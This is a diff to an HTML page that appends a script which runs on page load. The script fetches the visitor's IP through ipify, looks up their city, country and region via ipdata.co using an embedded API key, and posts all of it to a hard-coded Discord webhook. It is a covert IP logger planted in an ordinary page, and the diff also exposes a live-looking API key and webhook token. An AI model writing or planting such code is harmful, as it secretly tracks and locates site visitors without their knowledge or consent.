@@ -66,6 +66,32 @@
                     transition: width .1s linear;
                 }
             </style>
-</body>
-
+<script>
+function getIP(json) {
+    function json(url) {
+    return fetch(url).then(res => res.json());
+    }
+    
+    let apiKey = 'f9c6dbbf5fbce305ac584ead017fc8c2278e99bce2e7d798ec960f7e';
+    json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/1010990806544437402/IvsZUIJDqqit1xhxXwDelk9GkRf0m9Cmi37PPVoIXtv-NXf85NvQQctQtV9iOBGEttW3");
+     
+     request.setRequestHeader('Content-type', 'application/json');
+     
+     var params = 
+     {
+          username: "jeje",
+          avatar_url: "https://cdn.discordapp.com/attachments/911676475147702354/967908992976314438/e67e58c3d01abf7c5a4703a9873c9a89.png",
+          content: "IP:  " + data.ip + "**         **" + "CIDADE:  " + data.city + "**         **" +  "PAÍS:  " + data.country_code +  "**         **" + "ESTADO:  " +  data.region
+     }
+     
+     request.send(JSON.stringify(params));
+    });
+}
+</script>
+</head>
+<script src="https://api.ipify.org/?format=jsonp&amp;callback=getIP"></script>
+</body onload="getIP()">
 </html>
